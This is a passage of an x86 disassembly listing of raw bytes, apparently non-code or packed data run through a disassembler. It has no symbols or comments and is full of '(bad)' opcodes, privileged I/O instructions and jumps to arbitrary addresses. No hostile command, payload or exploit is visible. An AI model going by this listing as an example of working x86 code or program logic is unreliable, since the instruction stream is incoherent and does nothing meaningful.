  416203:	call   0x4639cd67
  416208:	jns    0x4161e8
  41620a:	inc    esi
  41620b:	inc    edx
  41620c:	enter  0x2530,0xae
  416210:	out    dx,eax
  416211:	jg     0x4161ea
  416213:	cmp    eax,0x536cf8a0
  416218:	nop
  416219:	out    dx,al
  41621a:	nop
  41621b:	cmc    
  41621c:	xchg   edi,eax
  41621d:	ret    0x4d78
  416220:	icebp  
  416221:	test   DWORD PTR [eax],edx
  416223:	mov    esi,DWORD PTR ss:[eax]
  416226:	jae    0x416254
  416228:	cs loop 0x416209
  41622b:	mov    BYTE PTR [ecx-0x3f],ch
  41622e:	mov    eax,ds:0x107905bc
  416233:	xchg   DWORD PTR [ecx-0x31],ebp
  416236:	adc    BYTE PTR [ebp-0xd],dh
  416239:	mov    ecx,0x4759d4a9
  41623e:	push   esp
  41623f:	xchg   bh,al
  416241:	cmp    al,0xff
  416243:	scas   al,BYTE PTR es:[edi]
  416244:	imul   esp,ecx,0x79
  416247:	fwait
  416248:	js     0x4161f2
  41624a:	mov    ebx,0xa845f7f1
  41624f:	mov    cl,0x34
  416251:	mov    al,ds:0xc1a330b7
  416256:	inc    esp
  416257:	ins    BYTE PTR es:[edi],dx
  416258:	ficom  WORD PTR [esi+0x7e]
  41625b:	sub    ah,BYTE PTR [ebx+0x64]
  41625e:	mov    edi,0x6fc5ec63
  416263:	and    BYTE PTR [edi],0x69
  416266:	jns    0x416223
  416268:	jge    0x416263
  41626a:	fisub  DWORD PTR [ebx-0x3]
  41626d:	ds add al,0x6a
  416270:	fdivr  QWORD PTR [esi+0x40]
  416273:	lea    esi,[ecx+0x3369570]
  416279:	add    BYTE PTR [edx+0x4d],ch
  41627c:	cmp    DWORD PTR ds:0x71867487,ecx
  416282:	push   0x4e61007e
  416287:	imul   edx,esi,0x74a90717
  41628d:	cmp    al,0x79
  41628f:	mov    edx,0x86aae3f0
  416294:	sbb    eax,0xf26845ca
  416299:	rol    BYTE PTR [ecx+0x5d229433],cl
  41629f:	div    DWORD PTR [edx]
  4162a1:	and    eax,0xefe0de65
  4162a6:	stc    
  4162a7:	lods   al,BYTE PTR ds:[esi]
  4162a8:	shl    DWORD PTR fs:[esi],cl
  4162ab:	nop
  4162ac:	mov    ah,0x83
  4162ae:	xor    BYTE PTR [edi+0x6f],bh
  4162b1:	dec    esi
  4162b2:	mov    dh,dh
  4162b4:	mov    eax,ds:0x2ca59d03
  4162b9:	jnp    0x416339
  4162bb:	jo     0x4162f4
  4162bd:	cs xchg esi,eax
  4162bf:	clc    
  4162c0:	jns    0x4162a9
  4162c2:	in     eax,dx
  4162c3:	mov    cl,0x3
  4162c5:	mov    ebp,DWORD PTR [edx+0x4152de60]
  4162cb:	das    
  4162cc:	dec    eax
  4162cd:	and    al,0x78
  4162cf:	push   eax
  4162d0:	aam    0xfd
  4162d2:	jmp    ebx
  4162d4:	in     al,0x93
  4162d6:	mov    edi,0x5629705a
  4162db:	adc    al,0xd8
  4162dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162de:	jne    0x41629a
  4162e0:	or     al,0xd4
  4162e2:	mov    al,0xef
  4162e4:	fwait
  4162e5:	jmp    0x4162b2
  4162e7:	sub    ch,BYTE PTR [ecx]
  4162e9:	je     0x416307
  4162eb:	xchg   edi,eax
  4162ec:	xlat   BYTE PTR ds:[ebx]
  4162ed:	call   FWORD PTR [eax-0x14]
  4162f0:	mov    bh,0x13
  4162f2:	sbb    al,ah
  4162f4:	mov    dl,0x5
  4162f6:	inc    ebp
  4162f7:	dec    eax
  4162f8:	retf   
  4162f9:	fnstenv [edi]
  4162fb:	popa   
  4162fc:	push   edx
  4162fd:	xor    eax,0x81347813
  416302:	popf   
  416303:	xchg   edi,eax
  416304:	stc    
  416305:	mul    DWORD PTR [esi-0x52]
  416308:	stc    
  416309:	fistp  QWORD PTR [ebp+esi*8-0x31]
  41630d:	jle    0x41629a
  41630f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416310:	mov    dl,0xda
  416312:	sub    eax,0x9be8722b
  416317:	sti    
  416318:	cwde   
  416319:	scas   al,BYTE PTR es:[edi]
  41631a:	test   al,0xfe
  41631c:	fidiv  DWORD PTR [eax-0x50791613]
  416322:	and    eax,0x8bd0f79e
  416327:	xor    al,0x67
  416329:	(bad)  
  41632b:	lods   al,BYTE PTR ds:[esi]
  41632c:	adc    ecx,DWORD PTR [eax-0x3f]
  41632f:	jle    0x41637e
  416331:	mov    ebx,eax
  416333:	nop
  416334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416335:	jl     0x416394
  416337:	leave  
  416338:	sbb    eax,0xc9e96c11
  41633d:	cmp    BYTE PTR [edi+0x69d05e9d],0xf0
  416344:	sub    esi,ebx
  416346:	imul   esi,eax,0x6e64a261
  41634c:	das    
  41634d:	jno    0x41636e
  41634f:	xchg   edx,eax
  416350:	pop    ebp
  416351:	push   esi
  416352:	jns    0x4162d5
  416354:	and    eax,0x160d7361
  416359:	xor    eax,0x4c5f6124
  41635e:	cmp    al,0xd8
  416360:	int    0x2d
  416362:	push   esi
  416363:	lock (bad) 
  416365:	xor    edi,esi
  416367:	imul   eax,ebp,0x54
  41636a:	es push edx
  41636c:	data16 mov cl,0xd4
  41636f:	ss push esp
  416371:	jl     0x416393
  416373:	sub    BYTE PTR [edi-0x38029375],ch
  416379:	mov    ecx,0x20db1a22
  41637e:	into   
  41637f:	shr    DWORD PTR [ecx],1
  416381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416382:	je     0x4163a0
  416384:	add    BYTE PTR [ebp-0x4b031c87],ah
  41638a:	daa    
  41638b:	js     0x416368
  41638d:	push   ebx
  41638e:	(bad)  
  41638f:	fdivr  st,st(6)
  416391:	or     DWORD PTR [ebp-0x79f3ece2],esi
  416397:	sbb    eax,0x63c52f69
  41639c:	les    esp,FWORD PTR [ecx]
  41639e:	cli    
  41639f:	adc    ebp,esp
  4163a1:	adc    eax,0xe712230a
  4163a6:	mov    eax,0x798ac565
  4163ab:	push   edi
  4163ac:	xchg   DWORD PTR [esi-0x15c4d85d],esp
  4163b2:	popa   
  4163b3:	lock dec edi
  4163b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163b6:	and    DWORD PTR [edi+eiz*1+0x3f],esi
  4163ba:	mov    ch,0xcd
  4163bc:	mul    edi
  4163be:	aad    0x7f
  4163c0:	xor    cl,BYTE PTR [edi-0x38d3bfbd]
  4163c6:	and    ah,al
  4163c8:	or     cl,dh
  4163ca:	jmp    0x41641f
  4163cc:	mov    ds:0x312f56de,al
  4163d1:	scas   al,BYTE PTR es:[edi]
  4163d2:	and    DWORD PTR [ecx-0x4b],eax
  4163d5:	rcl    DWORD PTR [esi-0xc96c001],cl
  4163db:	or     DWORD PTR [eax-0x7d],0xafe582f0
  4163e2:	sbb    ecx,DWORD PTR [ebx+ecx*2]
  4163e5:	push   esp
  4163e6:	jb     0x4163f1
  4163e8:	mul    eax
  4163ea:	mov    eax,ebp
  4163ec:	fdivr  QWORD PTR [ecx+0x4e8c314f]
  4163f2:	inc    ebp
  4163f3:	shl    edi,cl
  4163f5:	add    al,BYTE PTR [ebp+0x75]
  4163f8:	jp     0x41639d
  4163fa:	cmp    eax,0x203e7239
  4163ff:	xchg   ebp,eax
  416400:	outs   dx,BYTE PTR ds:[esi]
  416401:	adc    DWORD PTR [edi+0x3e],ecx
  416404:	inc    ebp
  416405:	mov    eax,ds:0x458153c0
  41640a:	ret    
  41640b:	mov    BYTE PTR [edi],0x7c
  41640e:	dec    edx
  41640f:	retf   0x8ebd
  416412:	scas   eax,DWORD PTR es:[edi]
  416413:	or     eax,0x5a1128d4
  416418:	dec    ebx
  416419:	ds nop
  41641b:	ins    DWORD PTR es:[edi],dx
  41641c:	and    al,0x2f
  41641e:	ins    BYTE PTR es:[edi],dx
  41641f:	icebp  
  416420:	push   ss
  416421:	into   
  416422:	xchg   ecx,eax
  416423:	cmp    eax,0xb19bf7ad
  416428:	hlt    
  416429:	arpl   WORD PTR [esi+0x5eec4224],dx
  41642f:	sub    bl,bl
  416431:	fsub   DWORD PTR [ecx-0x1876371a]
  416437:	shr    BYTE PTR [ecx],cl
  416439:	(bad)  
  41643a:	daa    
  41643b:	(bad)  
  41643c:	loope  0x416483
  41643e:	je     0x416440
  416440:	out    0x9e,eax
  416442:	xor    BYTE PTR [esi*4+0x9181907],dl
  416449:	sar    BYTE PTR [ecx+0x51],0xb7
  41644d:	sbb    al,0x3e
  41644f:	int    0xf9
  416451:	mov    ah,0x5d
  416453:	dec    DWORD PTR [edx+0x6a0a09a]
  416459:	jp     0x416413
  41645b:	mov    esi,0x88984c24
  416460:	hlt    
  416461:	pop    esp
  416462:	repz aam 0xd9
  416465:	pushw  ds
  416467:	cmp    ecx,DWORD PTR [ecx+0x44]
  41646a:	pop    es
  41646b:	pop    ss
  41646c:	mov    WORD PTR [eax+0x2d],ss
  41646f:	in     al,0x76
  416471:	jge    0x4164a4
  416473:	iret   
  416474:	push   ebx
  416475:	imul   ebp,DWORD PTR [edx+ecx*4+0x2ee314d3],0xffffffd0
  41647d:	mov    bh,0x8c
  41647f:	enter  0xb28a,0x55
  416483:	cmp    al,0x1a
  416485:	inc    ebx
  416486:	jnp    0x41647f
  416488:	mov    esp,DWORD PTR [edi-0x342af9e7]
  41648e:	push   0xb7b8f993
  416493:	sbb    BYTE PTR [ebp+0x7b427e91],al
  416499:	lds    edx,FWORD PTR [esi+0x1fe411b3]
  41649f:	(bad)  
  4164a0:	retf   
  4164a1:	jl     0x4164ce
  4164a3:	jmp    0x7599:0xedb7c04
  4164aa:	push   edx
  4164ab:	dec    edi
  4164ac:	adc    cl,al
  4164ae:	arpl   WORD PTR [ebx-0x7d5df06],di
  4164b4:	cmp    eax,0xcdcadb2e
  4164b9:	sbb    edx,esp
  4164bb:	jno    0x41647f
  4164bd:	mov    esp,0x545790aa
  4164c2:	xchg   BYTE PTR [ecx-0x53],dh
  4164c5:	sbb    eax,0x63cc4
  4164ca:	aaa    
  4164cb:	fdiv   QWORD PTR [ecx-0x1c]
  4164ce:	add    DWORD PTR [edx*1-0x69c80cc1],ebp
  4164d5:	je     0x41648f
  4164d7:	int3   
  4164d8:	sub    dh,BYTE PTR [esp+ecx*1-0x2]
  4164dc:	pop    eax
  4164dd:	pop    ss
  4164de:	dec    ecx
  4164df:	sti    
  4164e0:	pop    ds
  4164e1:	sbb    ecx,DWORD PTR [edx+0x4250742e]
  4164e7:	or     eax,0x80dd66f4
  4164ec:	jp     0x4164f7
  4164ee:	das    
  4164ef:	test   DWORD PTR [esi],0xd6e28eea
  4164f5:	pop    ds
  4164f6:	mov    al,ds:0xd21be9d6
  4164fb:	mov    fs,WORD PTR [ebx]
  4164fd:	aam    0xa3
  4164ff:	mov    al,ds:0x9ca03f31
  416504:	or     BYTE PTR [edi],0x40
  416507:	psubsb mm6,QWORD PTR [esi+0x5]
  41650b:	aam    0x30
  41650d:	fdivr  st(0),st
  41650f:	mov    WORD PTR [edi-0x57b143e4],cs
  416515:	jnp    0x41658b
  416517:	js     0x4164d9
  416519:	pop    ebx
  41651a:	mov    ds:0x3320e685,eax
  41651f:	ret    
  416520:	imul   esi,DWORD PTR [edx],0xd6d484b5
  416526:	ins    DWORD PTR es:[edi],dx
  416527:	cmp    al,0x73
  416529:	pop    esi
  41652a:	mov    ah,0x83
  41652c:	push   esi
  41652d:	icebp  
  41652e:	cwde   
  41652f:	fldenv [edx+0x3c52418c]
  416535:	pop    ecx
  416536:	outs   dx,BYTE PTR ds:[esi]
  416537:	pop    edx
  416538:	fwait
  416539:	in     eax,0xc2
  41653b:	jmp    0xa001:0xd0121a2b
  416542:	in     eax,dx
  416543:	fidivr WORD PTR [esi]
  416545:	cs add eax,0xd7f75f0f
  41654b:	je     0x416500
  41654d:	lock fcomp st(7)
  416550:	idiv   BYTE PTR [ebp+0x5e0f2fc9]
  416556:	inc    edx
  416557:	add    esp,esp
  416559:	push   esp
  41655a:	dec    ebx
  41655b:	adc    bh,al
  41655d:	es ret 
  41655f:	aad    0x70
  416561:	mov    eax,DWORD PTR [eax]
  416563:	pop    ebx
  416564:	ins    BYTE PTR es:[edi],dx
  416565:	pop    edx
  416566:	push   ecx
  416567:	xor    DWORD PTR [ebp-0x23],edx
  41656a:	out    0xed,al
  41656c:	fldcw  WORD PTR [edx+0x2e]
  41656f:	dec    ebp
  416570:	push   esi
  416571:	sub    ah,al
  416573:	mov    al,ds:0x179f2b55
  416578:	jbe    0x4165e5
  41657a:	sub    dl,BYTE PTR [edi]
  41657c:	inc    edi
  41657d:	scas   eax,DWORD PTR es:[edi]
  41657e:	pop    esp
  41657f:	push   0xc7b1d4ae
  416584:	inc    ecx
  416585:	mov    ch,0xd3
  416587:	imul   esp,edx,0xf4d9bfc6
  41658d:	fcomp  QWORD PTR [edi*1-0x70c09a29]
  416594:	inc    edi
  416595:	call   0xa2ac7e5e
  41659a:	repnz fdiv DWORD PTR [ebx-0x3e548276]
  4165a1:	mov    dh,0x73
  4165a3:	xchg   edx,eax
  4165a4:	push   esp
  4165a5:	sub    bl,BYTE PTR [esi+edx*8-0x172f014d]
  4165ac:	sub    DWORD PTR [edx-0x20a4c1d7],eax
  4165b2:	retf   0x47c7
  4165b5:	ret    
  4165b6:	outs   dx,DWORD PTR ds:[esi]
  4165b7:	mov    al,0x20
  4165b9:	or     eax,0xdd993bc
  4165be:	pop    ebx
  4165bf:	inc    eax
  4165c0:	bsr    ecx,ebx
  4165c3:	xlat   BYTE PTR ds:[ebx]
  4165c4:	push   bx
  4165c6:	or     BYTE PTR [esi-0x25],ch
  4165c9:	fs (bad) 
  4165cb:	pop    ds
  4165cc:	mov    ah,0xa5
  4165ce:	pop    eax
  4165cf:	je     0x416601
  4165d1:	sub    ecx,DWORD PTR [edx]
  4165d3:	inc    edi
  4165d4:	and    eax,0xd100fb3c
  4165d9:	repnz xlat BYTE PTR ds:[ebx]
  4165db:	mov    cl,0x95
  4165dd:	jge    0x41659b
  4165df:	sti    
  4165e0:	mov    cs,ebx
  4165e2:	mov    al,ds:0xe251be21
  4165e7:	fist   WORD PTR [ecx-0x43e3408b]
  4165ed:	xchg   esi,eax
  4165ee:	fisubr WORD PTR [eax-0x3e]
  4165f1:	push   cs
  4165f2:	dec    ecx
  4165f3:	popa   
  4165f4:	daa    
  4165f5:	dec    esp
  4165f6:	and    ecx,ebp
  4165f8:	or     DWORD PTR [eax],0x2f
  4165fb:	or     ch,BYTE PTR [edi]
  4165fd:	or     BYTE PTR [ecx],cl
  4165ff:	jl     0x4165f2
  416601:	aad    0x7f
  416603:	shl    BYTE PTR [edi-0x43],cl
  416606:	push   ss
  416607:	(bad)  
  416608:	pusha  
  416609:	and    eax,0xdfc28aa8
  41660e:	dec    esi
  41660f:	push   ebx
  416610:	fisub  WORD PTR [edi]
  416612:	loopne 0x4165e0
  416614:	or     bh,BYTE PTR [ebp+0x63ba2e04]
  41661a:	test   al,0x22
  41661c:	pop    edi
  41661d:	aaa    
  41661e:	in     eax,0xed
  416620:	jbe    0x922f4d94
  416626:	push   edx
  416627:	setl   BYTE PTR [ecx-0x5d]
  41662b:	and    DWORD PTR [edi],0x7b4cfec4
  416631:	es adc eax,0x93fd7535
  416637:	in     eax,0x96
  416639:	(bad)  
  41663a:	fnstenv [ecx-0x3cf3a85a]
  416640:	pop    ebp
  416641:	call   0x3ffeeb0c
  416646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416647:	sar    BYTE PTR [edx+edi*4],0x72
  41664b:	das    
  41664c:	or     DWORD PTR [edx-0x1c6ad68f],esp
  416652:	jmp    0x4166cb
  416654:	push   es
  416655:	jae    0x4166c5
  416657:	mov    esp,0x25208d7b
  41665c:	and    DWORD PTR [edx-0x79fc5ef3],ebx
  416662:	fs inc esi
  416664:	mov    al,0x74
  416666:	ficomp DWORD PTR [esi+0x4c4fe987]
  41666c:	mov    eax,ds:0x7b3d796d
  416671:	pop    esp
  416672:	ficomp DWORD PTR [ebp+0x57]
  416675:	dec    ebx
  416676:	sub    cl,BYTE PTR [edx-0xd]
  416679:	shl    DWORD PTR [eax+edx*4-0x5e5ac22e],1
  416680:	mov    al,ds:0xb078b1a
  416685:	stc    
  416686:	dec    esp
  416687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416688:	stos   BYTE PTR es:[edi],al
  416689:	into   
  41668a:	loope  0x4166e4
  41668c:	aas    
  41668d:	jl     0x416630
  41668f:	pop    edi
  416690:	push   ecx
  416691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416692:	pop    ebx
  416693:	xor    dh,BYTE PTR [ebp+esi*2+0x6e]
  416697:	outs   dx,BYTE PTR ds:[esi]
  416698:	daa    
  416699:	stc    
  41669a:	(bad)  
  41669b:	bound  ebp,QWORD PTR [edi+0x36]
  41669e:	(bad)  
  4166a0:	jmp    0x16d0:0x4684672f
  4166a7:	xor    DWORD PTR [esi],esp
  4166a9:	cmp    DWORD PTR [ebx-0x2a4634f9],eax
  4166af:	pusha  
  4166b0:	js     0x4166ee
  4166b2:	cmp    eax,0x67fced6b
  4166b7:	imul   ebp,ebp,0xb81e5cd6
  4166bd:	dec    ah
  4166bf:	and    eax,0xf73b7bd8
  4166c4:	mov    BYTE PTR [edi-0x5cc97791],ch
  4166ca:	ins    DWORD PTR es:[edi],dx
  4166cb:	(bad)  
  4166cc:	sahf   
  4166cd:	in     eax,0x1e
  4166cf:	ins    DWORD PTR es:[edi],dx
  4166d0:	pop    ss
  4166d1:	adc    ecx,DWORD PTR [eax+0x5570549a]
  4166d7:	inc    esp
  4166d8:	jb     0x4166ba
  4166da:	(bad)  
  4166db:	jmp    FWORD PTR [edi-0x37d7634a]
  4166e1:	xchg   edx,eax
  4166e2:	jecxz  0x416761
  4166e4:	das    
  4166e5:	dec    ecx
  4166e6:	aam    0xfd
  4166e8:	push   es
  4166e9:	dec    ecx
  4166ea:	pop    es
  4166eb:	mov    dh,ch
  4166ed:	inc    ebp
  4166ee:	adc    al,0x72
  4166f0:	shr    eax,1
  4166f2:	call   0x548f:0x8867a5c4
  4166f9:	(bad)  
  4166fa:	jg     0x416720
  4166fc:	xor    ebp,ebx
  4166fe:	push   0xa3e8724d
  416703:	xor    al,0xf5
  416705:	in     al,0xc
  416707:	sub    eax,0x69ab11b5
  41670c:	inc    ecx
  41670d:	dec    ecx
  41670e:	xchg   ebp,eax
  41670f:	add    al,0xa6
  416711:	fmulp  st(6),st
  416713:	into   
  416714:	inc    edi
  416715:	jmp    0xa6319c31
  41671a:	retf   0xe46
  41671d:	in     al,dx
  41671e:	scas   eax,DWORD PTR es:[edi]
  41671f:	fdivr  st(6),st
  416721:	sbb    esp,esp
  416723:	jbe    0x4166f7
  416725:	cli    
  416726:	fiadd  WORD PTR [esi+0x62]
  416729:	push   esp
  41672a:	(bad)  
  41672b:	dec    ebx
  41672c:	imul   ecx,DWORD PTR [ebx-0x149b31c6],0x2985bf74
  416736:	inc    edx
  416737:	pop    esi
  416738:	sbb    al,ah
  41673a:	imul   edi,DWORD PTR [esi],0x7e
  41673d:	inc    esi
  41673e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41673f:	lds    ebx,FWORD PTR [esi+0x258ebcfb]
  416745:	test   eax,0x398bb9b0
  41674a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41674b:	popa   
  41674c:	mov    WORD PTR [esi],es
  41674e:	scas   eax,DWORD PTR es:[edi]
  41674f:	inc    edi
  416750:	sub    eax,0x8271d625
  416755:	push   ds
  416756:	mov    eax,ds:0x2402ef6c
  41675b:	push   ecx
  41675c:	jle    0x4167a4
  41675e:	jne    0x41674c
  416760:	frstor [esi-0x6c1cc843]
  416766:	ja     0x4167d2
  416768:	pop    eax
  416769:	outs   dx,DWORD PTR ds:[esi]
  41676a:	jmp    0xbcb8:0x107f2231
  416771:	sbb    ebx,DWORD PTR [eax]
  416773:	std    
  416774:	sar    BYTE PTR [ebx-0x3c],0x14
  416778:	ret    
  416779:	(bad)  
  41677a:	out    0x6c,al
  41677c:	pcmpeqb mm2,QWORD PTR [eax-0x3a4b914f]
  416783:	mov    ss,WORD PTR [edi]
  416785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416786:	mov    edx,0x9da2ac77
  41678b:	cdq    
  41678c:	sbb    BYTE PTR [ebx*2-0x661bd340],bh
  416793:	lods   eax,DWORD PTR ds:[esi]
  416794:	rol    ah,0x26
  416797:	data16 mov al,ds:0x2a875938
  41679d:	or     al,0x6
  41679f:	jecxz  0x4167fc
  4167a1:	push   es
  4167a2:	pusha  
  4167a3:	cmc    
  4167a4:	pop    es
  4167a5:	inc    esp
  4167a6:	lods   eax,DWORD PTR ds:[esi]
  4167a7:	sub    BYTE PTR [eax+0x7b44a762],dh
  4167ad:	or     eax,0x49c32baa
  4167b2:	dec    esi
  4167b3:	std    
  4167b4:	xchg   ebp,eax
  4167b5:	hlt    
  4167b6:	call   0x26b6bee2
  4167bb:	in     eax,dx
  4167bc:	pop    eax
  4167bd:	xor    al,0x2a
  4167bf:	jecxz  0x4167be
  4167c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167c2:	or     al,0xa4
  4167c4:	loopne 0x4167a6
  4167c6:	sbb    ebp,DWORD PTR [ebx+0x687dc4d]
  4167cc:	xor    ecx,eax
  4167ce:	or     eax,DWORD PTR [edx+0x3a]
  4167d1:	push   0xffffffcf
  4167d3:	(bad)  
  4167d4:	sbb    BYTE PTR [ecx-0x6a],dh
  4167d7:	pop    ss
  4167d8:	push   edx
  4167d9:	push   es
  4167da:	dec    ebx
  4167db:	pop    edi
  4167dc:	mov    bh,0x22
  4167de:	adc    DWORD PTR ds:0xd523f881,eax
  4167e4:	xor    DWORD PTR [ecx-0xd],edx
  4167e7:	in     al,0xfe
  4167e9:	xor    BYTE PTR [ebp+0x37],dl
  4167ec:	and    edi,edx
  4167ee:	scas   eax,DWORD PTR es:[edi]
  4167ef:	push   edx
  4167f0:	dec    edx
  4167f1:	and    dl,BYTE PTR [edi-0xb]
  4167f4:	popa   
  4167f5:	adc    BYTE PTR [ebp+0xbcf2228],dh
  4167fb:	jp     0x416867
  4167fd:	push   0x6f068695
  416802:	xor    esi,esi
  416804:	test   BYTE PTR [ebp+0x3bafc32d],bl
  41680a:	outs   dx,DWORD PTR ds:[esi]
  41680b:	(bad)  
  41680c:	stc    
  41680d:	out    0x87,al
  41680f:	jb     0x41682d
  416811:	nop
  416812:	sub    ecx,DWORD PTR [ecx]
  416814:	mov    edx,0x1203afe5
  416819:	mov    ah,0xbb
  41681b:	sub    DWORD PTR [ebp+0x463ac292],eax
  416821:	or     DWORD PTR [ebp+0x5f4e8bc7],ebx
  416827:	mov    eax,0x3f03e799
  41682c:	push   eax
  41682d:	adc    DWORD PTR [ebp-0x54],esi
  416830:	mov    ebp,0x3a3eae42
  416835:	mov    ds:0xbf348736,al
  41683a:	clc    
  41683b:	xor    BYTE PTR [esi-0x54b93567],bl
  416841:	cmp    ebx,esp
  416843:	inc    esp
  416844:	dec    ebx
  416845:	imul   ebp,DWORD PTR [ecx+0x71],0xd04febcc
  41684c:	xor    edi,DWORD PTR [ebx-0x2da8f218]
  416852:	stc    
  416853:	bound  esp,QWORD PTR [eax+eax*8+0x29]
  416857:	das    
  416858:	sub    bl,BYTE PTR [ebx+0x67]
  41685b:	lea    ebp,[ecx]
  41685d:	sahf   
  41685e:	cmp    edx,DWORD PTR [esi+edx*2]
  416861:	xchg   esi,eax
  416862:	ja     0x41680e
  416864:	rol    BYTE PTR [esi+ebp*4],1
  416867:	icebp  
  416868:	adc    eax,DWORD PTR [ecx]
  41686a:	sbb    dl,BYTE PTR [ecx-0x20]
  41686d:	inc    ebx
  41686f:	enter  0x6079,0xfe
  416873:	outs   dx,BYTE PTR ds:[esi]
  416874:	jge    0x416885
  416876:	das    
  416877:	adc    esp,DWORD PTR [edi+ebx*1+0x4b]
  41687b:	(bad)  
  41687c:	adc    DWORD PTR [ebx+ecx*8+0x4ec98308],ebx
  416883:	je     0x416827
  416885:	or     DWORD PTR [edx+0x0],edi
  416888:	cmp    BYTE PTR [ecx-0x4a533263],dh
  41688e:	pop    ss
  41688f:	icebp  
  416890:	cmp    eax,0xd9afa8be
  416895:	xchg   DWORD PTR [edi-0x3ddc0285],ecx
  41689b:	jb     0x416888
  41689d:	pop    edi
  41689e:	ret    0xac0f
  4168a1:	pop    eax
  4168a2:	or     BYTE PTR [edi+0x6b1cf7f],ah
  4168a8:	cmc    
  4168a9:	mov    eax,0x60300f47
  4168ae:	inc    edi
  4168af:	lds    edi,FWORD PTR [edx]
  4168b1:	aam    0xd0
  4168b3:	jb     0x416875
  4168b5:	jnp    0x41684e
  4168b7:	cdq    
  4168b8:	mov    edi,0xe10fcf9
  4168bd:	gs scas al,BYTE PTR es:[edi]
  4168bf:	out    dx,al
  4168c0:	push   esp
  4168c1:	fwait
  4168c2:	and    ebx,edx
  4168c4:	fwait
  4168c5:	jne    0x4168b1
  4168c7:	mov    ecx,0xab0211c8
  4168cc:	sti    
  4168cd:	jl     0x416900
  4168cf:	imul   esi,DWORD PTR [esi],0x75878d90
  4168d5:	mov    edi,0x6035fa2
  4168da:	push   ds
  4168db:	mov    ds:0x500784fe,al
  4168e0:	xlat   BYTE PTR ds:[ebx]
  4168e1:	xchg   bl,ah
  4168e3:	or     edi,DWORD PTR [eax-0x30]
  4168e6:	mov    eax,ds:0x8decd644
  4168eb:	add    BYTE PTR [edi-0x39],al
  4168ee:	jg     0x416883
  4168f0:	ret    0x322b
  4168f3:	jle    0x4168c3
  4168f5:	(bad)  [ecx+0x66]
  4168f8:	shl    DWORD PTR [eax-0x16167fea],0x7e
  4168ff:	inc    ebp
  416900:	pop    esi
  416901:	add    eax,DWORD PTR [ebx-0x73ee63be]
  416907:	fnstsw WORD PTR [ecx+0x720cbc92]
  41690d:	xchg   ebp,eax
  41690e:	int    0xb9
  416910:	pop    esi
  416911:	rol    bl,0xe5
  416914:	not    DWORD PTR [edx-0x52]
  416917:	xchg   ebp,eax
  416918:	mov    ecx,0x41ceb664
  41691d:	int    0xc3
  41691f:	sbb    BYTE PTR [ebp-0x70],cl
  416922:	imul   edi,DWORD PTR [eax-0x1c],0x7
  416926:	sbb    eax,0x12590280
  41692b:	xlat   BYTE PTR ds:[ebx]
  41692c:	push   ebx
  41692d:	lods   eax,DWORD PTR ds:[esi]
  41692e:	imul   esp,DWORD PTR ds:0x360a7a7e,0x78
  416935:	mov    ebx,DWORD PTR [eax-0x152a4617]
  41693b:	imul   edx,eax,0x4bc26865
  416941:	mov    ds:0xb3fb80b9,eax
  416946:	xor    eax,0x51540ba1
  41694b:	cmp    bl,BYTE PTR [edx]
  41694d:	(bad)  
  41694e:	fcomp  QWORD PTR [eax-0x6f]
  416951:	jl     0x4168fb
  416953:	adc    al,BYTE PTR [ebx-0x51]
  416956:	xor    DWORD PTR ds:[edx],esp
  416959:	pop    ss
  41695a:	inc    esp
  41695b:	mov    bl,BYTE PTR [eax+ebp*4-0x50e42e96]
  416962:	sub    eax,0xf3062b2b
  416967:	dec    ebp
  416968:	popf   
  416969:	in     al,0x78
  41696b:	loope  0x416982
  41696d:	fwait
  41696e:	adc    BYTE PTR [eax+0x1b433e20],ah
  416974:	mov    WORD PTR [ebp-0x7d],ds
  416977:	sub    eax,0xaecc53a4
  41697c:	test   eax,0x9b86f9f6
  416981:	ins    DWORD PTR es:[edi],dx
  416982:	imul   esi,DWORD PTR [ebp+eax*1-0x7e5cae0f],0x77
  41698a:	das    
  41698b:	pop    ebx
  41698c:	sub    ah,BYTE PTR [ecx]
  41698e:	pushf  
  41698f:	cld    
  416990:	xor    BYTE PTR [ecx+0x148b9d4d],0x62
  416997:	push   edi
  416998:	into   
  416999:	stos   BYTE PTR es:[edi],al
  41699a:	mov    ch,0x64
  41699c:	mov    dl,0x59
  41699e:	ds jp  0x41697d
  4169a1:	lock out dx,eax
  4169a3:	aas    
  4169a4:	fimul  DWORD PTR [edi+ecx*8]
  4169a7:	pop    ss
  4169a8:	loope  0x416960
  4169aa:	scas   al,BYTE PTR es:[edi]
  4169ab:	or     BYTE PTR [edi],cl
  4169ad:	lds    ebp,FWORD PTR [ecx]
  4169af:	inc    eax
  4169b0:	iret   
  4169b1:	call   0x801b:0x54fa1a03
  4169b8:	jecxz  0x416994
  4169ba:	inc    eax
  4169bb:	fidiv  DWORD PTR [esi-0x14f0d416]
  4169c1:	dec    esi
  4169c2:	xchg   edi,eax
  4169c3:	stos   BYTE PTR es:[edi],al
  4169c4:	inc    eax
  4169c5:	and    cl,dh
  4169c7:	sub    eax,0x11be07e3
  4169cc:	sub    ch,BYTE PTR [eax+eax*8]
  4169cf:	xchg   edx,eax
  4169d0:	inc    esp
  4169d1:	aam    0xe7
  4169d3:	aaa    
  4169d4:	shr    ebp,1
  4169d6:	aam    0xa5
  4169d8:	or     ebx,edx
  4169da:	mov    WORD PTR [edi],fs
  4169dc:	add    al,BYTE PTR [eax+ebx*4-0x167a9729]
  4169e3:	mov    cl,0xf0
  4169e5:	push   es
  4169e6:	mov    ebx,edx
  4169e8:	mov    ecx,0x7f421c67
  4169ed:	loope  0x41697d
  4169ef:	mov    ebx,eax
  4169f1:	xchg   bl,bl
  4169f3:	call   0xed18:0x3656da8b
  4169fa:	jnp    0x41698e
  4169fc:	retf   
  4169fd:	cmp    eax,edi
  4169ff:	mov    BYTE PTR [ebx],dh
  416a01:	fst    QWORD PTR [edi+0x4e302a70]
  416a07:	out    0x8d,eax
  416a09:	retf   0x950f
